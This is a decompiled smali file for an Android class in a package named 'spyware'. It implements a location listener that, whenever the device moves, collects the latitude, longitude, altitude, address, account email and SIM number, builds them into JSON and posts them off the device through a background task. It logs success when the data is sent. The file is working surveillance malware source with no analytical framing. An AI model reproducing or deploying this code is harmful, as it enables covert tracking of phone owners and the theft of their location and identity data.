.class Landroid/spyware/TrackerS$1;
.super Ljava/lang/Object;
.source "TrackerS.java"

# interfaces
.implements Landroid/location/LocationListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Landroid/spyware/TrackerS;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Landroid/spyware/TrackerS;


# direct methods
.method constructor <init>(Landroid/spyware/TrackerS;)V
    .registers 2
    .param p1, "this$0"    # Landroid/spyware/TrackerS;

    .prologue
    .line 45
    iput-object p1, p0, Landroid/spyware/TrackerS$1;->this$0:Landroid/spyware/TrackerS;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onLocationChanged(Landroid/location/Location;)V
    .registers 22
    .param p1, "location"    # Landroid/location/Location;

    .prologue
    .line 49
    const-string v3, "::trace"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "::INF  onLocationChanged: "

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, p1

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 51
    move-object/from16 v0, p0

    iget-object v3, v0, Landroid/spyware/TrackerS$1;->this$0:Landroid/spyware/TrackerS;

    # getter for: Landroid/spyware/TrackerS;->harvester:Landroid/spyware/Harvester;
    invoke-static {v3}, Landroid/spyware/TrackerS;->access$000(Landroid/spyware/TrackerS;)Landroid/spyware/Harvester;

    move-result-object v3

    invoke-virtual {v3}, Landroid/spyware/Harvester;->isNetworkConnected()Z

    move-result v3

    if-eqz v3, :cond_d3

    .line 52
    move-object/from16 v0, p0

    iget-object v3, v0, Landroid/spyware/TrackerS$1;->this$0:Landroid/spyware/TrackerS;

    # getter for: Landroid/spyware/TrackerS;->context:Landroid/content/Context;
    invoke-static {v3}, Landroid/spyware/TrackerS;->access$100(Landroid/spyware/TrackerS;)Landroid/content/Context;

    move-result-object v3

    invoke-virtual/range {p1 .. p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v6

    invoke-virtual/range {p1 .. p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v8

    invoke-static {v3, v6, v7, v8, v9}, Landroid/spyware/Position;->getAddress(Landroid/content/Context;DD)Ljava/lang/String;

    move-result-object v5

    .line 53
    .local v5, "address":Ljava/lang/String;
    new-instance v2, Landroid/spyware/Position;

    move-object/from16 v0, p0

    iget-object v3, v0, Landroid/spyware/TrackerS$1;->this$0:Landroid/spyware/TrackerS;

    # getter for: Landroid/spyware/TrackerS;->harvester:Landroid/spyware/Harvester;
    invoke-static {v3}, Landroid/spyware/TrackerS;->access$000(Landroid/spyware/TrackerS;)Landroid/spyware/Harvester;

    move-result-object v3

    invoke-virtual {v3}, Landroid/spyware/Harvester;->getEmail()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v4, v0, Landroid/spyware/TrackerS$1;->this$0:Landroid/spyware/TrackerS;

    # getter for: Landroid/spyware/TrackerS;->harvester:Landroid/spyware/Harvester;
    invoke-static {v4}, Landroid/spyware/TrackerS;->access$000(Landroid/spyware/TrackerS;)Landroid/spyware/Harvester;

    move-result-object v4

    invoke-virtual {v4}, Landroid/spyware/Harvester;->getSim()Ljava/util/Map;

    move-result-object v4

    const-string v6, "simNo"

    invoke-interface {v4, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    .line 54
    invoke-virtual/range {p1 .. p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v6

    invoke-virtual/range {p1 .. p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v8

    invoke-virtual/range {p1 .. p1}, Landroid/location/Location;->getAltitude()D

    move-result-wide v10

    .line 55
    invoke-virtual/range {p1 .. p1}, Landroid/location/Location;->getAccuracy()F

    move-result v12

    invoke-virtual/range {p1 .. p1}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v13

    new-instance v14, Ljava/util/Date;

    invoke-virtual/range {p1 .. p1}, Landroid/location/Location;->getTime()J

    move-result-wide v18

    move-wide/from16 v0, v18

    invoke-direct {v14, v0, v1}, Ljava/util/Date;-><init>(J)V

    invoke-direct/range {v2 .. v14}, Landroid/spyware/Position;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;DDDFLjava/lang/String;Ljava/util/Date;)V

    .line 56
    .local v2, "currentLocation":Landroid/spyware/Position;
    new-instance v17, Landroid/spyware/Param;

    const-string v3, "Tracker"

    invoke-virtual {v2}, Landroid/spyware/Position;->toJSON()Lorg/json/JSONObject;

    move-result-object v4

    move-object/from16 v0, v17

    invoke-direct {v0, v3, v4}, Landroid/spyware/Param;-><init>(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 57
    .local v17, "mParams":Landroid/spyware/Param;
    new-instance v15, Landroid/spyware/PostDataAT;

    invoke-direct {v15}, Landroid/spyware/PostDataAT;-><init>()V

    .line 60
    .local v15, "PostJObject":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    const/4 v3, 0x1

    :try_start_93
    new-array v3, v3, [Landroid/spyware/Param;

    const/4 v4, 0x0

    aput-object v17, v3, v4

    invoke-virtual {v15, v3}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 62
    invoke-virtual {v15}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Integer;

    const/16 v4, 0xc8

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/Integer;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b4

    .line 64
    const-string v3, "::trace"

    const-string v4, "::INF  Tracker: Position successfully sent."

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_b4
    .catch Ljava/lang/Exception; {:try_start_93 .. :try_end_b4} :catch_b5

    .line 71
    .end local v2    # "currentLocation":Landroid/spyware/Position;
    .end local v5    # "address":Ljava/lang/String;
    .end local v15    # "PostJObject":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .end local v17    # "mParams":Landroid/spyware/Param;
    :cond_b4
    :goto_b4
    return-void

    .line 66
    .restart local v2    # "currentLocation":Landroid/spyware/Position;
    .restart local v5    # "address":Ljava/lang/String;
    .restart local v15    # "PostJObject":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .restart local v17    # "mParams":Landroid/spyware/Param;
    :catch_b5
    move-exception v16

    .line 67
    .local v16, "e":Ljava/lang/Exception;
    const-string v3, "::trace"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "::ERR  "

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-static/range {v16 .. v16}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_b4

    .line 70
    .end local v2    # "currentLocation":Landroid/spyware/Position;
    .end local v5    # "address":Ljava/lang/String;
    .end local v15    # "PostJObject":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .end local v16    # "e":Ljava/lang/Exception;
    .end local v17    # "mParams":Landroid/spyware/Param;
    :cond_d3
    const-string v3, "::trace"

    const-string v4, "::ERR  Tracker: No internet connectivity."

    invoke-static {v3, v4}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_b4
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .registers 5
    .param p1, "provider"    # Ljava/lang/String;

    .prologue
    .line 76
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "::DEB  onProviderDisabled: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p1}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 78
    iget-object v0, p0, Landroid/spyware/TrackerS$1;->this$0:Landroid/spyware/TrackerS;

    # invokes: Landroid/spyware/TrackerS;->setLocationListener()V
    invoke-static {v0}, Landroid/spyware/TrackerS;->access$200(Landroid/spyware/TrackerS;)V

    .line 79
    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .registers 5
    .param p1, "provider"    # Ljava/lang/String;

    .prologue
    .line 84
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "::DEB  onProviderEnabled: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p1}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 86
    iget-object v0, p0, Landroid/spyware/TrackerS$1;->this$0:Landroid/spyware/TrackerS;

    # invokes: Landroid/spyware/TrackerS;->setLocationListener()V
    invoke-static {v0}, Landroid/spyware/TrackerS;->access$200(Landroid/spyware/TrackerS;)V

    .line 87
    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .registers 7
    .param p1, "provider"    # Ljava/lang/String;
    .param p2, "status"    # I
    .param p3, "extras"    # Landroid/os/Bundle;

    .prologue
    .line 92
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "::DEB  onStatusChanged: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p1}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 93
    return-void
.end method
